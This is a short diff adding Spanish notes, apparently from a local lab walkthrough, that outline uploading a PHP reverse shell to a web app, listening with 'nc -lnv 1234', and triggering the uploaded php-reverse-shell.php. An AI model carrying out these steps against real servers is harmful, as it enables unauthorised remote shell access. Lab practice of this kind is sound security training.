@@ -1,0 +1,9 @@
+Nos conectamos a:
+
+http://127.0.0.1:8082/index.php
+
+Comprobar y Subir la reverse shell .php
+
+quedar a la espera con el nc -lnv 1234
+
+http://172.0.0.1:8082/uploads/php-reverse-shell.php
